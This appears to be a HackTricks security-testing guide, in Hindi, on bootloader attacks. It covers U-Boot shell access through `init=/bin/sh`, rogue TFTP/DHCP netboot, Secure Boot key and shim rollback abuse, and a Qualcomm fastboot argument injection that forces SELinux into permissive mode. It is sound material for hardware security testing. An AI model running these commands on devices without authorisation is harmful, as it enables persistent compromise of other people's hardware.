# Bootloader परीक्षण

{{#include ../../banners/hacktricks-training.md}}

डिवाइस के startup configuration में बदलाव करने और U-Boot तथा UEFI-class loaders जैसे bootloaders का परीक्षण करने के लिए नीचे दिए गए चरण सुझाए गए हैं। शुरुआती code execution हासिल करने, signature/rollback protections का आकलन करने और recovery या network-boot paths का दुरुपयोग करने पर ध्यान दें।

संबंधित: bl2_ext patching के ज़रिए MediaTek secure-boot bypass:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot के quick wins और environment का दुरुपयोग

1. Interpreter shell तक पहुँचें
   - Boot के दौरान, `bootcmd` के execute होने से पहले U-Boot prompt पर जाने के लिए, break key (अक्सर कोई भी key, 0, space, या board-specific "magic" sequence) दबाएँ।<sup>[[1]](#references)</sup>

2. Boot की स्थिति और variables जाँचें
   - उपयोगी commands:
     - `printenv` (environment dump करें)
     - `bdinfo` (board की जानकारी, memory addresses)
     - `help bootm; help booti; help bootz` (समर्थित kernel boot methods)
     - `help ext4load; help fatload; help tftpboot` (उपलब्ध loaders)

3. Root shell पाने के लिए boot arguments में बदलाव करें
   - `init=/bin/sh` जोड़ें, ताकि kernel सामान्य init के बजाय shell पर जाए:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. अपने TFTP server से Netboot करें
   - नेटवर्क कॉन्फ़िगर करें और LAN से kernel/fit image प्राप्त करें:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. environment के माध्यम से बदलाव स्थायी करें
   - यदि env storage write-protected नहीं है, तो आप नियंत्रण स्थायी कर सकते हैं:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` जैसे variables की जाँच करें, जो fallback paths को प्रभावित करते हैं। गलत तरीके से कॉन्फ़िगर की गई values से shell में बार-बार प्रवेश मिल सकता है।

6. Debug/असुरक्षित features की जाँच करें
   - इनकी तलाश करें: `bootdelay` > 0, `autoboot` disabled, unrestricted `usb start; fatload usb 0:1 ...`, serial के ज़रिए `loady`/`loads` की क्षमता, untrusted media से `env import`, और signature checks के बिना load किए गए kernels/ramdisks।

7. U-Boot image/verification testing
   - यदि platform FIT images के साथ secure/verified boot का दावा करता है, तो unsigned और tampered images—दोनों को आज़माएँ:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` का न होना या legacy `verify=n` व्यवहार अक्सर arbitrary payloads को boot करने देता है।
   - केवल allow/deny परिणाम पर न रुकें: हालिया FIT research से पता चला कि verification path स्वयं pre-auth attack surface हो सकता है। बाहरी तौर पर stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables` और overlay / `extra-conf` handling के negative tests करें।
   - यदि आपके पास matching source tree है, तो असली hardware को छूने से पहले U-Boot sandbox में FIT verification behaviour को दोहराने के लिए `test/vboot/vboot_test.sh` एक तेज़ तरीका है।<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` और script bootflows
   - आधुनिक U-Boot builds में, `bootcmd` अक्सर Standard Boot के इर्द-गिर्द एक wrapper मात्र होता है। इसका मतलब है कि writable media, PXE या SPI flash वास्तविक trust boundary बन सकते हैं, भले ही दिखाई देने वाला environment harmless लगे।
   - `extlinux` bootmeth, `/` और `/boot` के अंतर्गत `extlinux/extlinux.conf` खोजता है; script bootmeth पहले `boot.scr.uimg` और फिर `boot.scr` खोजता है। Network boot के दौरान, script filename `boot_script_dhcp` से आ सकता है।
   - उपयोगी triage commands:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - परीक्षण के लिए दुरुपयोग के मामले: `boot_targets` में पहले आने वाला attacker-controlled USB/SD मीडिया, writable `/boot/extlinux/extlinux.conf`, `boot.scr` उपलब्ध कराने वाला rogue TFTP, या `script_offset_f` के ज़रिए SPI-backed script execution।
   - यदि platform FIT verification पर निर्भर है, तो सुनिश्चित करें कि configurations पर configuration level पर हस्ताक्षर किए गए हों, केवल per-image स्तर पर नहीं; `required-mode=all` किसी भी एक required key को स्वीकार करने से अधिक मज़बूत है।

## Network-boot सतह (DHCP/PXE) और rogue servers

9. PXE/DHCP parameter fuzzing
   - U-Boot के legacy BOOTP/DHCP handling में memory-safety से जुड़ी समस्याएँ रही हैं। उदाहरण के लिए, CVE‑2024‑42040 में crafted DHCP responses के ज़रिए memory disclosure का वर्णन है, जिससे U-Boot memory के bytes नेटवर्क पर leak हो सकते हैं।<sup>[[4]](#references)</sup> DHCP/PXE code paths को अत्यधिक लंबे और edge-case मानों (option 67 bootfile-name, vendor options, file/servername fields) के साथ जाँचें और hangs/leaks पर नज़र रखें।
   - Netboot के दौरान boot parameters को stress करने के लिए न्यूनतम Scapy snippet:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - यह भी जाँचें कि OS-side provisioning scripts से chain होने पर PXE filename fields बिना sanitization के shell/loader logic को पास किए जाते हैं या नहीं।

10. Rogue DHCP server command injection की जाँच
   - एक rogue DHCP/PXE service सेटअप करें और filename या options fields में characters inject करके boot chain के बाद के stages में command interpreters तक पहुँचने की कोशिश करें। Metasploit का DHCP auxiliary, `dnsmasq` या custom Scapy scripts इसके लिए उपयोगी हैं। पहले lab network को अलग-थलग करना सुनिश्चित करें।

## सामान्य boot को override करने वाले SoC ROM recovery modes

कई SoC में BootROM का "loader" mode होता है, जो flash images अमान्य होने पर भी USB/UART के ज़रिए code स्वीकार करता है। यदि secure-boot fuses नहीं जले हैं, तो इससे chain के बहुत शुरुआती चरण में arbitrary code execution मिल सकता है।

- NXP i.MX (Serial Download Mode)
  - Tools: `uuu` (mfgtools3) या `imx-usb-loader`।
  - उदाहरण: RAM से custom U-Boot push करके चलाने के लिए `imx-usb-loader u-boot.imx`।
- Allwinner (FEL)
  - Tool: `sunxi-fel`।
  - उदाहरण: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` या `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`।
- Rockchip (MaskROM)
  - Tool: `rkdeveloptool`।
  - उदाहरण: loader stage करने और custom U-Boot upload करने के लिए `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`।

जाँचें कि device के secure-boot eFuses/OTP जले हुए हैं या नहीं। यदि नहीं, तो BootROM download modes अक्सर आपका first-stage payload सीधे SRAM/DRAM से execute करके higher-level verification (U-Boot, kernel, rootfs) को bypass कर देते हैं।

## UEFI/PC-class bootloaders: त्वरित जाँच

11. ESP tampering, rollback और key-enrollment की जाँच
   - EFI System Partition (ESP) mount करें और loader components की जाँच करें: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths।
   - जब संभव हो, OS से Secure Boot state और key databases dump करें:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - यदि platform Setup Mode में है, बिना authentication के key enrollment स्वीकार करता है, या test/default Platform Key (PKfail class) के साथ आता है, तो local admin या physical attacker अपनी KEK/db enroll कर सकता है और Secure Boot को “enabled” दिखाते हुए arbitrary EFI binaries boot कर सकता है।<sup>[[3]](#references)</sup>
   - यदि Secure Boot revocations (dbx) up-to-date नहीं हैं, तो downgraded या ज्ञात रूप से vulnerable signed boot components से boot करने की कोशिश करें। यदि platform अब भी पुराने shims/bootmanagers पर भरोसा करता है, तो persistence हासिल करने के लिए अक्सर ESP से अपना kernel या `grub.cfg` लोड किया जा सकता है।

12. पुराने shim / SBAT / dbx revocation की जांच
   - पुराने Microsoft-signed shims और vendor forks अब भी BYOVD-style bootkit path के रूप में काम कर सकते हैं, यदि revocations पुराने हों। एक isolated lab में, ESP पर ऐतिहासिक रूप से vulnerable shim रखें और अपना `grubx64.efi` या kernel chainload करने की कोशिश करें।<sup>[[11]](#references)</sup>
   - त्वरित प्रारंभिक जांच:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - यदि shim revocation list में होने के बावजूद चलता है, तो firmware/OS में `dbx` updates पुराने हैं या वह ऐसे forked loader पर भरोसा करता है जिसमें upstream SBAT protections कभी शामिल नहीं किए गए।

13. Boot logo parsing bugs (LogoFAIL class)
   - कई OEM/IBV firmwares में DXE के image-parsing flaws थे, जो boot logos को process करते हैं। यदि कोई attacker ESP पर vendor-specific path (जैसे, `\EFI\<vendor>\logo\*.bmp`) के अंतर्गत crafted image रख सके और reboot करे, तो Secure Boot enabled होने पर भी शुरुआती boot के दौरान code execution संभव हो सकता है। जांचें कि क्या platform user-supplied logos स्वीकार करता है और क्या OS से उन paths में लिखना संभव है।<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Android 16 के उन devices पर, जो **Generic Bootloader Library (GBL)** load करने के लिए Qualcomm के ABL का उपयोग करते हैं, यह validate करें कि ABL `efisp` partition से load किए जाने वाले UEFI app को **authenticate** करता है या नहीं। यदि ABL केवल UEFI app की **मौजूदगी** जांचता है और signatures verify नहीं करता, तो `efisp` में write primitive boot के समय **pre-OS unsigned code execution** का रास्ता बन जाता है।<sup>[[6]](#references)[[7]](#references)</sup>

व्यावहारिक जांच और abuse paths:

- **efisp write primitive**: `efisp` में custom UEFI app लिखने का कोई तरीका चाहिए (root/privileged service, OEM app bug, recovery/fastboot path)। इसके बिना, GBL loading gap तक सीधे पहुंचना संभव नहीं है।<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): कुछ builds `fastboot oem set-gpu-preemption` में अतिरिक्त tokens स्वीकार करते हैं और उन्हें kernel cmdline में जोड़ देते हैं। इसका उपयोग permissive SELinux लागू करने के लिए किया जा सकता है, जिससे protected partition में लिखना संभव हो जाता है:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  यदि डिवाइस patched है, तो command को अतिरिक्त arguments अस्वीकार करने चाहिए।<sup>[[5]](#references)[[6]](#references)</sup>
- **persistent flags के ज़रिए Bootloader unlock**: Boot-stage payload persistent unlock flags (जैसे, `is_unlocked=1`, `is_unlocked_critical=1`) बदल सकता है, ताकि OEM server/approval gates के बिना `fastboot oem unlock` का अनुकरण किया जा सके। अगले reboot के बाद यह बदलाव बना रहता है।<sup>[[6]](#references)</sup>

रक्षा/triage संबंधी नोट्स:

- पुष्टि करें कि ABL, `efisp` से आए GBL/UEFI payload का signature verification करता है या नहीं। अगर नहीं, तो `efisp` को persistence का high-risk surface मानें।
- जाँचें कि ABL fastboot OEM handlers को **argument की संख्या validate करने और अतिरिक्त tokens अस्वीकार करने** के लिए patched किया गया है या नहीं।<sup>[[8]](#references)[[9]](#references)</sup>

## Hardware संबंधी सावधानी

शुरुआती boot के दौरान SPI/NAND flash से काम करते समय सावधानी बरतें (जैसे, reads को bypass करने के लिए pins को ground करना) और हमेशा flash datasheet देखें। गलत समय पर short करने से डिवाइस या programmer खराब हो सकता है।

## नोट्स और अतिरिक्त सुझाव

- Environment blobs को RAM और storage के बीच ले जाने के लिए `env export -t ${loadaddr}` और `env import -t ${loadaddr}` आज़माएँ; कुछ platforms बिना authentication के removable media से env import करने देते हैं।
- Linux-आधारित उन systems में persistence के लिए जो `extlinux.conf` से boot होते हैं, boot partition पर `APPEND` line को बदलना (ताकि `init=/bin/sh` या `rd.break` जोड़ा जा सके) अक्सर पर्याप्त होता है, यदि signature checks लागू न हों।
- यदि target dual-slot / A/B updates का उपयोग करता है, तो [firmware analysis overview](README.md) में anti-rollback और slot-desync techniques देखें, ताकि bootloader से बाहर updater-only trust gaps न छूटें।
- यदि userland `fw_printenv/fw_setenv` उपलब्ध कराता है, तो जाँचें कि `/etc/fw_env.config` असली env storage से मेल खाता है। गलत offsets से आप गलत MTD region को read/write कर सकते हैं।

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [LogoFAIL की खोज: System boot के दौरान image parsing के खतरे](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys, UEFI Ecosystem में Secure Boot को कमज़ोर करती हैं](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 का विवरण](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: दो unsanitized strings के ज़रिए Xiaomi को unlock करना](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit से attackers bootloaders unlock कर सकते हैं](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: kernel cmdline में untrusted input के propagation को ठीक करना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: set-hw-fence-value command के लिए check जोड़ना](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Boot करने योग्य नहीं: U-Boot के FIT signature verification को तोड़ना](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders, Secure Boot bypass के प्रति संवेदनशील](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
